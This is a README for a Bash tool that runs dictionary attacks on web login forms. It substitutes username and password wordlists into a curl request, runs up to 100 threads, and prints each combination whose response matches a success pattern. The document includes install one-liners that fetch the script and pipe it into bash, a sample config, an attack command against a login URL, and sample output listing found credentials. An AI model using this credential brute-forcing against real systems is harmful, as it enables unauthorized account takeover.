# curl-request-dictionary-attack

Bash script to perform dictionary attacks on any request via simple template-like substitutions in complete curl manner.


## INSTALLATION

```
curl -s https://raw.githubusercontent.com/psyb0t/curl-request-dictionary-attack/master/curl-request-dictionary-attack > /usr/local/bin && chmod +x /usr/local/bin/curl-request-dictionary-attack
```

or

```
echo 'alias curl-request-dictionary-attack="curl -s https://raw.githubusercontent.com/psyb0t/curl-request-dictionary-attack/master/curl-request-dictionary-attack | bash -s --"' >> ~/.bashrc && source ~/.bashrc
```

## USAGE

```
% cp config.sh.sample config.sh && cat config.sh
max_threads=100
dict_fields=(
  "user_input" "./usernames.txt"
  "password_input" "./passwords.txt"
)
expect_grep_expr=("-i" "welcome")
```

`max_threads` - the maximum number of curl processes to spawn at a time

`dict_fields` - the template strings used in the command and which files to be used to read data to be put in place of those strings

`expect_grep_expr` - the grep command expression to expect when something interesting happens (in the example above the expression results in `grep -i "welcome"`)


```
./curl-request-dictionary-attack -skL -H "Referer: http://example.com/" --data "user={user_input}&password={password_input}&im_not_a_robot=1" "https://example.com/login"
```

whenever the `expect_grep_expr` does not return an empty string(based on the curl response) the entire curl command gets printed out

```
curl -skL -H Referer: http://example.com/ --data user=admin&password=admin-password&im_not_a_robot=1 https://example.com/login
curl -skL -H Referer: http://example.com/ --data user=basic-user&password=12345&im_not_a_robot=1 https://example.com/login
```
